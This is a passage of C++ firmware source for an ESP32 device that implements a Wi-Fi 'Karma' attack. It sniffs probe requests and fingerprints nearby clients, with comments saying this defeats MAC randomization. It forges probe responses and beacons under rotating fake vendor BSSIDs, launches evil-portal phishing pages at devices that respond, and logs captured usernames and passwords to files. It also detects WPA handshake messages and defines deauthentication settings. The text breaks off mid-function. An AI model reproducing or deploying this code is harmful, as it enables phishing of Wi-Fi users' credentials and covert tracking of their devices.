#include "FS.h"
#include <set>
#include <vector>
#include <map>
#include <algorithm>
#include <queue>
#include <Arduino.h>
#include <TimeLib.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "core/wifi/webInterface.h"
#include "driver/gpio.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "lwip/err.h"
#include "freertos/FreeRTOS.h"
#include "freertos/ringbuf.h"
#include "freertos/queue.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/sniffer.h"
#include "karma_attack.h"
#include <globals.h>

void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type);
void saveHandshakeToFile(const HandshakeCapture &hs);
void forceFullRedraw();

#ifndef KARMA_CHANNELS
#define KARMA_CHANNELS
const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
#endif

#define FILENAME "probe_capture_"
#define SAVE_INTERVAL 10
#define MAX_PROBE_BUFFER 200
#define MAC_CACHE_SIZE 100
#define MAX_CLIENT_TRACK 30
#define FAST_HOP_INTERVAL 500
#define DEFAULT_HOP_INTERVAL 2000
#define DEAUTH_INTERVAL 30000
#define VULNERABLE_THRESHOLD 3
#define AUTO_PORTAL_DELAY 2000
#define SSID_FREQUENCY_RESET 30000
#define RESPONSE_TIMEOUT_MS 5
#define BEACON_INTERVAL_MS 102400
#define MAX_CONCURRENT_SSIDS 4
#define MAC_ROTATION_INTERVAL 30000
#define MAX_PORTAL_TEMPLATES 10
#define MAX_PENDING_PORTALS 10
#define MAX_SSID_DB_SIZE 200
#define MAX_POPULAR_SSIDS 20
#define MAX_NETWORK_HISTORY 30
#define ACTIVE_PORTAL_CHANNEL 0
#define MAX_DEAUTH_PER_SECOND 10
#define DEAUTH_BURST_WINDOW 1000
#define BEACON_BURST_SIZE 8
#define BEACON_BURST_INTERVAL 60
#define LISTEN_WINDOW 250
#define KARMA_QUEUE_DEPTH 48
#define PORTAL_HEARTBEAT_INTERVAL 500
#define PORTAL_MAX_IDLE 60000

KarmaMode karmaMode = MODE_PASSIVE;
bool karmaPaused = false;

// Background portal tracking - pointer vector for multiple simultaneous portals
std::vector<BackgroundPortal*> activePortals;
int nextPortalIndex = 0;
unsigned long lastPortalHeartbeat = 0;
bool handshakeCaptureEnabled = false;
std::vector<HandshakeCapture> handshakeBuffer;

// Client tracking keyed by fingerprint, not MAC - defeats randomization
std::map<uint32_t, ClientBehavior> clientBehaviors;

const uint8_t vendorOUIs[][3] PROGMEM = {
    {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
    {0x00, 0x0C, 0x29}, {0x00, 0x1D, 0x0F}, {0x00, 0x26, 0x5E}, {0x00, 0x19, 0xE3},
    {0x00, 0x21, 0x91}, {0x00, 0x1E, 0x8C}, {0x00, 0x12, 0x17}, {0x00, 0x18, 0xDE},
    {0x00, 0x1E, 0xE1}, {0x00, 0x13, 0x10}, {0x00, 0x1C, 0xDF}, {0x00, 0x0F, 0xEA},
    {0x00, 0x14, 0x6C}, {0x00, 0x25, 0x9C}, {0x00, 0x11, 0x22}, {0x00, 0x16, 0x6F}
};

const uint8_t priorityChannels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
#define NUM_PRIORITY_CHANNELS 13

const uint8_t beacon_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
const uint8_t probe_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c};
const uint8_t ext_rates[] PROGMEM = {0x32, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60};
const uint8_t rsn_wpa3[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
                                    0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
                                    0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
const uint8_t rsn_wpa2[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
                                    0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
                                    0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
const uint8_t ht_cap[] PROGMEM = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
const uint8_t rotate_channels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};

uint8_t activePortalChannel = 0;
unsigned long deauthCount[14] = {0};
unsigned long lastDeauthReset = 0;
unsigned long lastBeaconBurst = 0;
uint8_t beaconsInBurst = 0;
QueueHandle_t karmaQueue = nullptr;
TaskHandle_t karmaWriterHandle = nullptr;
bool storageAvailable = true;

std::vector<String> SSIDDatabase::ssidCache;
bool SSIDDatabase::cacheLoaded = false;
String SSIDDatabase::currentFilename = "/ssid_list.txt";
bool SSIDDatabase::useLittleFS = false;

bool SSIDDatabase::loadFromFile() {
    if (cacheLoaded && !ssidCache.empty()) return true;
    ssidCache.clear();
    FS *fs = nullptr;
    if (!getFsStorage(fs)) return false;
    File file = fs->open(currentFilename, FILE_READ);
    if (!file) return false;
    while (file.available() && ssidCache.size() < MAX_SSID_DB_SIZE) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        if (line.startsWith("#") || line.startsWith("//")) continue;
        if (line.length() > 32) continue;
        ssidCache.push_back(line);
    }
    file.close();
    cacheLoaded = true;
    return !ssidCache.empty();
}

bool SSIDDatabase::setSourceFile(const String &filename, bool useLittleFSMode) {
    currentFilename = filename;
    useLittleFS = useLittleFSMode;
    cacheLoaded = false;
    ssidCache.clear();
    return loadFromFile();
}

bool SSIDDatabase::reload() {
    cacheLoaded = false;
    return loadFromFile();
}

void SSIDDatabase::clearCache() {
    ssidCache.clear();
    cacheLoaded = false;
}

bool SSIDDatabase::isLoaded() {
    return cacheLoaded && !ssidCache.empty();
}

String SSIDDatabase::getSourceFile() {
    return currentFilename;
}

size_t SSIDDatabase::getCount() {
    if (!cacheLoaded) loadFromFile();
    return ssidCache.size();
}

String SSIDDatabase::getSSID(size_t index) {
    if (!cacheLoaded) loadFromFile();
    if (index >= ssidCache.size()) return "";
    return ssidCache[index];
}

std::vector<String> SSIDDatabase::getAllSSIDs() {
    if (!cacheLoaded) loadFromFile();
    return ssidCache;
}

int SSIDDatabase::findSSID(const String &ssid) {
    if (!cacheLoaded) loadFromFile();
    for (size_t i = 0; i < ssidCache.size(); i++) {
        if (ssidCache[i] == ssid) return i;
    }
    return -1;
}

String SSIDDatabase::getRandomSSID() {
    if (!cacheLoaded) loadFromFile();
    if (ssidCache.empty()) return "";
    size_t index = random(ssidCache.size());
    return ssidCache[index];
}

void SSIDDatabase::getBatch(size_t startIndex, size_t count, std::vector<String> &result) {
    if (!cacheLoaded) if (!loadFromFile()) { result.clear(); return; }
    result.clear();
    if (startIndex >= ssidCache.size()) return;
    size_t endIndex = startIndex + count;
    if (endIndex > ssidCache.size()) endIndex = ssidCache.size();
    for (size_t i = startIndex; i < endIndex; i++) result.push_back(ssidCache[i]);
}

bool SSIDDatabase::contains(const String &ssid) {
    return findSSID(ssid) >= 0;
}

size_t SSIDDatabase::getAverageLength() {
    if (!cacheLoaded) loadFromFile();
    if (ssidCache.empty()) return 0;
    size_t total = 0;
    for (const auto &ssid : ssidCache) total += ssid.length();
    return total / ssidCache.size();
}

size_t SSIDDatabase::getMaxLength() {
    if (!cacheLoaded) loadFromFile();
    size_t maxLen = 0;
    for (const auto &ssid : ssidCache) if (ssid.length() > maxLen) maxLen = ssid.length();
    return maxLen;
}

size_t SSIDDatabase::getMinLength() {
    if (!cacheLoaded) loadFromFile();
    if (ssidCache.empty()) return 0;
    size_t minLen = 32;
    for (const auto &ssid : ssidCache) if (ssid.length() < minLen) minLen = ssid.length();
    return minLen;
}

ActiveBroadcastAttack::ActiveBroadcastAttack() 
    : currentIndex(0), batchStart(0), lastBroadcastTime(0), lastChannelHopTime(0),
      _active(false), currentChannel(1), totalSSIDsInFile(0), ssidsProcessed(0), updateCounter(0) {
    stats.startTime = millis();
}

String ActiveBroadcastAttack::getProgressString() const {
    return String(ssidsProcessed) + "/" + String(totalSSIDsInFile);
}

void ActiveBroadcastAttack::start() {
    size_t total = SSIDDatabase::getCount();
    if (total == 0) return;
    _active = true;
    currentIndex = 0;
    batchStart = 0;
    stats.startTime = millis();
    loadNextBatch();
    totalSSIDsInFile = SSIDDatabase::getCount();
    ssidsProcessed = 0;
    updateCounter = 0;
}

void ActiveBroadcastAttack::stop() {
    _active = false;
}

void ActiveBroadcastAttack::restart() {
    stop();
    delay(100);
    start();
}

bool ActiveBroadcastAttack::isActive() const {
    return _active;
}

void ActiveBroadcastAttack::setConfig(const BroadcastConfig &newConfig) {
    config = newConfig;
}

BroadcastConfig ActiveBroadcastAttack::getConfig() const {
    return config;
}

void ActiveBroadcastAttack::setBroadcastInterval(uint32_t interval) {
    config.broadcastInterval = interval;
}

void ActiveBroadcastAttack::setBatchSize(uint16_t size) {
    config.batchSize = size;
    loadNextBatch();
}

void ActiveBroadcastAttack::setChannel(uint8_t channel) {
    if (channel >= 1 && channel <= 14) currentChannel = channel;
}

void ActiveBroadcastAttack::update() {
    if (!_active) return;
    unsigned long now = millis();
    if (config.rotateChannels && (now - lastChannelHopTime > config.channelHopInterval)) {
        rotateChannel();
        lastChannelHopTime = now;
    }
    if (now - lastBroadcastTime < config.broadcastInterval) return;
    if (currentIndex >= currentBatch.size()) {
        batchStart += currentBatch.size();
        loadNextBatch();
        currentIndex = 0;
        if (currentBatch.empty()) {
            batchStart = 0;
            loadNextBatch();
        }
    }
    if (currentIndex < currentBatch.size()) {
        String ssid = currentBatch[currentIndex];
        if (!highPrioritySSIDs.empty() && stats.totalBroadcasts % 10 == 0) {
            size_t hpIndex = stats.totalBroadcasts % highPrioritySSIDs.size();
            ssid = highPrioritySSIDs[hpIndex];
        }
        broadcastSSID(ssid);
        currentIndex++;
        stats.totalBroadcasts++;
        ssidsProcessed++;
        updateCounter++;
        lastBroadcastTime = now;
        if (updateCounter >= 5) updateCounter = 0;
    }
}

void ActiveBroadcastAttack::processProbeResponse(const String &ssid, const String &mac) {
    if (!config.respondToProbes) return;
    recordResponse(ssid);
    if (config.prioritizeResponses) addHighPrioritySSID(ssid);
    if (stats.ssidResponseCount[ssid] >= 1) launchAttackForResponse(ssid, mac);
}

BroadcastStats ActiveBroadcastAttack::getStats() const {
    return stats;
}

size_t ActiveBroadcastAttack::getTotalSSIDs() const {
    return totalSSIDsInFile;
}

size_t ActiveBroadcastAttack::getCurrentPosition() const {
    return ssidsProcessed;
}

float ActiveBroadcastAttack::getProgressPercent() const {
    if (totalSSIDsInFile == 0) return 0.0f;
    return (ssidsProcessed * 100.0f) / totalSSIDsInFile;
}

std::vector<std::pair<String, size_t>> ActiveBroadcastAttack::getTopResponses(size_t count) const {
    std::vector<std::pair<String, size_t>> sorted;
    size_t i = 0;
    for (const auto &pair : stats.ssidResponseCount) {
        if (i++ >= 20) break;
        sorted.push_back(pair);
    }
    std::sort(sorted.begin(), sorted.end(),
        [](const auto &a, const auto &b) { return a.second > b.second; });
    if (sorted.size() > count) sorted.resize(count);
    return sorted;
}

void ActiveBroadcastAttack::addHighPrioritySSID(const String &ssid) {
    for (const auto &hpSSID : highPrioritySSIDs) if (hpSSID == ssid) return;
    highPrioritySSIDs.push_back(ssid);
    if (highPrioritySSIDs.size() > 10) highPrioritySSIDs.erase(highPrioritySSIDs.begin());
}

void ActiveBroadcastAttack::clearHighPrioritySSIDs() {
    highPrioritySSIDs.clear();
}

void ActiveBroadcastAttack::loadNextBatch() {
    currentBatch.clear();
    SSIDDatabase::getBatch(batchStart, config.batchSize, currentBatch);
}

void ActiveBroadcastAttack::broadcastSSID(const String &ssid) {
    sendBeaconFrameHelper(ssid, currentChannel);
}

void ActiveBroadcastAttack::rotateChannel() {
    static size_t channelIndex = 0;
    channelIndex = (channelIndex + 1) % (sizeof(rotate_channels) / sizeof(rotate_channels[0]));
    currentChannel = pgm_read_byte(&rotate_channels[channelIndex]);
}

void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t channel) {
    sendBeaconFrameHelper(ssid, channel);
}

void ActiveBroadcastAttack::recordResponse(const String &ssid) {
    stats.totalResponses++;
    if (stats.ssidResponseCount.size() < 30) {
        stats.ssidResponseCount[ssid]++;
    }
    stats.lastResponseTime = millis();
}

void ActiveBroadcastAttack::launchAttackForResponse(const String &ssid, const String &mac) {
    extern bool templateSelected;
    extern std::vector<PendingPortal> pendingPortals;
    extern PortalTemplate selectedTemplate;
    extern AttackConfig attackConfig;
    if (!templateSelected) return;
    int activeCount = 0;
    for (const auto &portal : pendingPortals) if (!portal.launched) activeCount++;
    if (activeCount >= config.maxActiveAttacks) return;
    if (pendingPortals.size() >= MAX_PENDING_PORTALS) return;
    PendingPortal portal;
    portal.ssid = ssid;
    portal.channel = currentChannel;
    portal.targetMAC = mac;
    portal.timestamp = millis();
    portal.launched = false;
    portal.templateName = selectedTemplate.name;
    portal.templateFile = selectedTemplate.filename;
    portal.isDefaultTemplate = selectedTemplate.isDefault;
    portal.verifyPassword = selectedTemplate.verifyPassword;
    portal.priority = 95;
    portal.tier = TIER_HIGH;
    portal.duration = attackConfig.highTierDuration;
    portal.isCloneAttack = false;
    portal.probeCount = 1;
    pendingPortals.push_back(portal);
    stats.successfulAttacks++;
}

ActiveBroadcastAttack broadcastAttack;

unsigned long last_time = 0;
unsigned long last_ChannelChange = 0;
unsigned long lastFrequencyReset = 0;
unsigned long lastBeaconTime = 0;
unsigned long lastMACRotation = 0;
uint8_t channl = 0;
bool flOpen = false;
bool is_LittleFS = true;
uint32_t pkt_counter = 0;
bool auto_hopping = true;
uint16_t hop_interval = DEFAULT_HOP_INTERVAL;

File _probe_file;
RingbufHandle_t macRingBuffer;
String filen = "";

ProbeRequest probeBuffer[MAX_PROBE_BUFFER];
uint16_t probeBufferIndex = 0;
bool bufferWrapped = false;

KarmaConfig karmaConfig;
AttackConfig attackConfig;
bool screenNeedsRedraw = false;
uint32_t pmkidCaptured = 0;
uint32_t assocBlocked = 0;

uint8_t channelActivity[14] = {0};
uint8_t currentPriorityChannel = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastSaveTime = 0;

uint32_t totalProbes = 0;
uint32_t uniqueClients = 0;
uint32_t karmaResponsesSent = 0;
uint32_t deauthPacketsSent = 0;
uint32_t autoPortalsLaunched = 0;
uint32_t cloneAttacksLaunched = 0;
uint32_t beaconsSent = 0;
bool isPortalActive = false;
bool restartKarmaAfterPortal = false;

std::map<String, NetworkHistory> networkHistory;
std::queue<ProbeResponseTask> responseQueue;
std::vector<ActiveNetwork> activeNetworks;
std::map<String, uint32_t> macBlacklist;
uint8_t currentBSSID[6];

std::vector<PortalTemplate> portalTemplates;
PortalTemplate selectedTemplate;
bool templateSelected = false;

std::map<String, uint16_t> ssidFrequency;
std::vector<std::pair<String, uint16_t>> popularSSIDs;

std::vector<PendingPortal> pendingPortals;

void forceFullRedraw() {
    // Completely clear the screen
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    
    // Force a full refresh of the display
    tft.setCursor(0, 0);
    tft.fillRect(0, 0, tftWidth, tftHeight, bruceConfig.bgColor);
    
    // Small delay to ensure display processes the clear
    delay(50);
}

// Helper: Generate clean display name from file path
String getDisplayName(const String &fullPath, bool isSD) {
    String prefix = isSD ? "[SD] " : "[FS] ";
    String filename = fullPath.substring(fullPath.lastIndexOf('/') + 1);
    filename.replace(".html", "");
    return prefix + filename;
}

// Helper: Generate unique portal ID for file naming
String generatePortalId(const String &templateName) {
    static int counter = 0;
    String safeName = templateName;
    safeName.replace(" ", "_");
    safeName.replace("[", "");
    safeName.replace("]", "");
    safeName.toLowerCase();
    safeName.replace("(verify)", "");
    safeName.trim();
    
    int instance = 1;
    FS *fs = nullptr;
    if (getFsStorage(fs)) {
        while (fs->exists("/PortalCreds/" + safeName + "_" + String(instance) + ".txt")) {
            instance++;
        }
    }
    
    return safeName + "_" + String(instance);
}

// Save captured portal credentials to SD/LittleFS
void savePortalCredentials(const String &ssid, const String &identifier, 
                          const String &password, const String &mac,
                          uint8_t channel, const String &templateName,
                          const String &portalId) {
    
    FS *fs = nullptr;
    if (!getFsStorage(fs)) return;
    
    if (!fs->exists("/PortalCreds")) {
        if (!fs->mkdir("/PortalCreds")) {
            Serial.println("[ERROR] Cannot create /PortalCreds");
            return;
        }
    }
    
    String filename = "/PortalCreds/" + portalId + ".txt";
    File file = fs->open(filename, FILE_WRITE);
    if (file) {
        file.println("=== PORTAL CAPTURE ===");
        file.printf("Portal: %s\n", portalId.c_str());
        file.printf("Time: %lu\n", millis());
        file.printf("Template: %s\n", templateName.c_str());
        file.printf("SSID: %s\n", ssid.c_str());
        file.printf("Client MAC: %s\n", mac.c_str());
        file.printf("Channel: %d\n", channel);
        file.printf("Identifier: %s\n", identifier.c_str());
        file.printf("Password: %s\n", password.c_str());
        file.println("=====================");
        file.close();
        Serial.printf("[PORTAL] Credentials saved to %s\n", filename.c_str());
    }
    
    File logFile = fs->open("/PortalCreds/captures_master.txt", FILE_APPEND);
    if (logFile) {
        logFile.printf("Time:%lu | Portal:%s | SSID:%s | ID:%s | PWD:%s | MAC:%s | CH:%d\n",
                      millis(), portalId.c_str(), ssid.c_str(), 
                      identifier.c_str(), password.c_str(), mac.c_str(), channel);
        logFile.close();
    }
}

String generateUniqueFilename(FS &fs, bool compressed) {
    String basePath = "/ProbeData/";
    String baseName = compressed ? "karma_compressed_" : "probe_capture_";
    String extension = compressed ? ".bin" : ".txt";
    if (!fs.exists(basePath)) fs.mkdir(basePath);
    int counter = 1;
    String filename;
    do {
        filename = basePath + baseName + String(counter) + extension;
        counter++;
    } while (fs.exists(filename) && counter < 100);
    return filename;
}

void initMACCache() {
    macRingBuffer = xRingbufferCreate(MAC_CACHE_SIZE * 18, RINGBUF_TYPE_NOSPLIT);
}

bool isMACInCache(const String &mac) {
    if (!macRingBuffer) return false;
    size_t itemSize;
    char *item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
    while (item) {
        if (String(item) == mac) {
            vRingbufferReturnItem(macRingBuffer, item);
            return true;
        }
        vRingbufferReturnItem(macRingBuffer, item);
        item = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
    }
    return false;
}

void addMACToCache(const String &mac) {
    if (!macRingBuffer) return;
    if (xRingbufferGetCurFreeSize(macRingBuffer) < mac.length() + 1) {
        size_t itemSize;
        char *oldItem = (char *)xRingbufferReceive(macRingBuffer, &itemSize, 0);
        if (oldItem) vRingbufferReturnItem(macRingBuffer, oldItem);
    }
    xRingbufferSend(macRingBuffer, mac.c_str(), mac.length() + 1, pdMS_TO_TICKS(100));
}

// Generate client fingerprint from probe request IEs - defeats MAC randomization
uint32_t generateClientFingerprint(const uint8_t *frame, int len) {
    uint32_t hash = 5381;
    int pos = 24;
    
    while (pos + 1 < len) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        
        if (pos + 2 + tagLen > len) break;
        
        hash = ((hash << 5) + hash) + tag;
        hash = ((hash << 5) + hash) + tagLen;
        
        int maxBytes = (tagLen < 4) ? tagLen : 4;
        for (int i = 0; i < maxBytes; i++) {
            hash = ((hash << 5) + hash) + frame[pos + 2 + i];
        }
        
        pos += 2 + tagLen;
    }
    
    return hash;
}

bool isProbeRequestWithSSID(const wifi_promiscuous_pkt_t *packet) {
    if (!packet || packet->rx_ctrl.sig_len < 24) return false;
    const uint8_t *frame = packet->payload;
    uint8_t frameType = (frame[0] & 0x0C) >> 2;
    uint8_t frameSubType = (frame[0] & 0xF0) >> 4;
    if (frameType != 0x00 || frameSubType != 0x04) return false;
    return true;
}

String extractSSID(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int pos = 24;
    while (pos + 1 < packet->rx_ctrl.sig_len) {
        uint8_t tag = frame[pos];
        uint8_t len = frame[pos + 1];
        if (tag == 0x00 && len > 0 && len <= 32 && (pos + 2 + len <= packet->rx_ctrl.sig_len)) {
            bool hidden = true;
            for (int i = 0; i < len; i++) {
                if (frame[pos + 2 + i] != 0x00) {
                    hidden = false;
                    break;
                }
            }
            if (hidden) return "*HIDDEN*";
            char ssid[len + 1];
            memcpy(ssid, &frame[pos + 2], len);
            ssid[len] = '\0';
            return String(ssid);
        }
        pos += 2 + len;
    }
    return "*WILDCARD*";
}

String extractMAC(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
    return String(mac);
}

RSNInfo extractRSNInfo(const uint8_t *frame, int len) {
    RSNInfo rsn = {0, 0, 0, 0};
    int pos = 24;
    while (pos + 1 < len) {
        uint8_t tag = frame[pos];
        uint8_t tagLen = frame[pos + 1];
        if (tag == 0x30 && tagLen >= 2) {
            if (pos + 2 + tagLen <= len) {
                rsn.version = (frame[pos + 2] << 8) | frame[pos + 3];
                uint8_t groupCipher = frame[pos + 4];
                if (groupCipher == 0x00) rsn.groupCipher = 1;
                else if (groupCipher == 0x02) rsn.groupCipher = 2;
                if (tagLen > 6) {
                    uint8_t pairwiseCipher = frame[pos + 8];
                    if (pairwiseCipher == 0x00) rsn.pairwiseCipher = 1;
                    else if (pairwiseCipher == 0x02) rsn.pairwiseCipher = 2;
                }
                if (tagLen > 12) {
                    uint8_t akmSuite = frame[pos + 12];
                    if (akmSuite == 0x00 || akmSuite == 0x02) rsn.akmSuite = 1;
                    else if (akmSuite == 0x08) rsn.akmSuite = 2;
                }
            }
        }
        pos += 2 + tagLen;
    }
    return rsn;
}

bool isEAPOL(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;
    if (len < (24 + 8 + 4)) return false;
    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && 
        payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 && 
        payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }
    if ((payload[0] & 0x0F) == 0x08) {
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && 
            payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 && 
            payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }
    return false;
}

int classifyEAPOLMessage(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *payload = pkt->payload;
    int qosOffset = ((payload[0] & 0x0F) == 0x08) ? 2 : 0;
    int keyInfoOffset = 24 + qosOffset + 8 + 4 + 1;
    if (pkt->rx_ctrl.sig_len < keyInfoOffset + 2) return -1;
    uint16_t keyInfo = (payload[keyInfoOffset] << 8) | payload[keyInfoOffset + 1];
    bool install = keyInfo & (1 << 6);
    bool ack = keyInfo & (1 << 7);
    bool mic = keyInfo & (1 << 8);
    bool secure = keyInfo & (1 << 9);
    if (ack && !mic && !install) return 1;
    if (!ack && mic && !install && !secure) return 2;
    if (ack && mic && install) return 3;
    if (!ack && mic && !install && secure) return 4;
    return -1;
}

void analyzeClientBehavior(const ProbeRequest &probe) {
    auto it = clientBehaviors.find(probe.fingerprint);
    
    if (it == clientBehaviors.end()) {
        if (clientBehaviors.size() >= MAX_CLIENT_TRACK) {
            uint32_t oldestFingerprint = 0;
            unsigned long oldestTime = UINT32_MAX;
            for (const auto &pair : clientBehaviors) {
                if (pair.second.lastSeen < oldestTime) {
                    oldestTime = pair.second.lastSeen;
                    oldestFingerprint = pair.first;
                }
            }
            if (oldestFingerprint != 0) {
                clientBehaviors.erase(oldestFingerprint);
            }
        }
        
        ClientBehavior behavior;
        behavior.fingerprint = probe.fingerprint;
        behavior.lastMAC = probe.mac;
        behavior.firstSeen = probe.timestamp;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount = 1;
        behavior.avgRSSI = probe.rssi;
        behavior.probedSSIDs.push_back(probe.ssid);
        behavior.favoriteChannel = probe.channel;
        behavior.lastKarmaAttempt = 0;
        behavior.isVulnerable = (probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*");
        clientBehaviors[probe.fingerprint] = behavior;
        uniqueClients++;
    } else {
        ClientBehavior &behavior = it->second;
        behavior.lastSeen = probe.timestamp;
        behavior.probeCount++;
        behavior.avgRSSI = (behavior.avgRSSI + probe.rssi) / 2;
        if (probe.channel >= 1 && probe.channel <= 14) {
            channelActivity[probe.channel - 1]++;
            if (channelActivity[probe.channel - 1] > channelActivity[behavior.favoriteChannel - 1])
                behavior.favoriteChannel = probe.channel;
        }
        bool ssidExists = false;
        for (const auto &existingSSID : behavior.probedSSIDs) {
            if (existingSSID == probe.ssid) { ssidExists = true; break; }
        }
        if (!ssidExists && probe.ssid.length() > 0 && probe.ssid != "*WILDCARD*" && behavior.probedSSIDs.size() < 5) {
            behavior.probedSSIDs.push_back(probe.ssid);
            if (behavior.probedSSIDs.size() >= VULNERABLE_THRESHOLD) behavior.isVulnerable = true;
        }
    }
}

uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
    uint8_t score = 0;
    if (probe.rssi > -50) score += 30;
    else if (probe.rssi > -65) score += 20;
    else if (probe.rssi > -75) score += 10;
    if (client.probeCount > 10) score += 25;
    else if (client.probeCount > 5) score += 15;
    else if (client.probeCount > 2) score += 5;
    if (client.isVulnerable) score += 20;
    unsigned long sinceLast = millis() - client.lastSeen;
    if (sinceLast < 5000) score += 15;
    else if (sinceLast < 15000) score += 10;
    else if (sinceLast < 30000) score += 5;
    if (probe.ssid == "*WILDCARD*") score = 0;
    return min(score, (uint8_t)100);
}

AttackTier determineAttackTier(uint8_t priority) {
    if (priority >= 80) return TIER_HIGH;
    if (priority >= 60) return TIER_MEDIUM;
    if (priority >= 40) return TIER_FAST;
    return TIER_NONE;
}

uint16_t getPortalDuration(AttackTier tier) {
    switch(tier) {
        case TIER_CLONE: return (uint16_t)attackConfig.cloneDuration;
        case TIER_HIGH: return attackConfig.highTierDuration;
        case TIER_MEDIUM: return attackConfig.mediumTierDuration;
        case TIER_FAST: return attackConfig.fastTierDuration;
        default: return attackConfig.mediumTierDuration;
    }
}

void generateRandomBSSID(uint8_t *bssid) {
    uint8_t vendorIndex = esp_random() % (sizeof(vendorOUIs) / 3);
    memcpy_P(bssid, vendorOUIs[vendorIndex], 3);
    bssid[3] = esp_random() & 0xFF;
    bssid[4] = esp_random() & 0xFF;
    bssid[5] = esp_random() & 0xFF;
    bssid[0] &= 0xFE;
}

void rotateBSSID() {
    if (millis() - lastMACRotation > MAC_ROTATION_INTERVAL) {
        generateRandomBSSID(currentBSSID);
        lastMACRotation = millis();
    }
}

size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid, 
                                 const String &targetMAC, uint8_t channel, 
                                 const RSNInfo &rsn, bool isHidden) {
    uint8_t pos = 0;
    buffer[pos++] = 0x50;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    sscanf(targetMAC.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &buffer[pos], &buffer[pos+1], &buffer[pos+2],
           &buffer[pos+3], &buffer[pos+4], &buffer[pos+5]);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    memcpy(&buffer[pos], currentBSSID, 6);
    pos += 6;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    for (int i = 0; i < 8; i++) buffer[pos++] = 0x00;
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    if (rsn.akmSuite > 0 || rsn.pairwiseCipher > 0) {
        buffer[pos++] = 0x31;
        buffer[pos++] = 0x04;
    } else {
        buffer[pos++] = 0x21;
        buffer[pos++] = 0x04;
    }
    buffer[pos++] = 0x00;
    buffer[pos++] = isHidden ? 0x00 : (uint8_t)ssid.length();
    if (!isHidden && ssid.length() > 0 && ssid != "*HIDDEN*" && ssid != "*WILDCARD*") {
        memcpy(&buffer[pos], ssid.c_str(), ssid.length());
        pos += ssid.length();
    }
    buffer[pos++] = 0x01;
    buffer[pos++] = sizeof(probe_rates);
    memcpy_P(&buffer[pos], probe_rates, sizeof(probe_rates));
    pos += sizeof(probe_rates);
    buffer[pos++] = 0x03;
    buffer[pos++] = 0x01;
    buffer[pos++] = channel;
    buffer[pos++] = 0x05;
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x2a;
    buffer[pos++] = 0x01;
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x32;
    buffer[pos++] = sizeof(ext_rates);
    memcpy_P(&buffer[pos], ext_rates, sizeof(ext_rates));
    pos += sizeof(ext_rates);
    if (rsn.akmSuite > 0) {
        buffer[pos++] = 0x30;
        if (rsn.akmSuite == 2) {
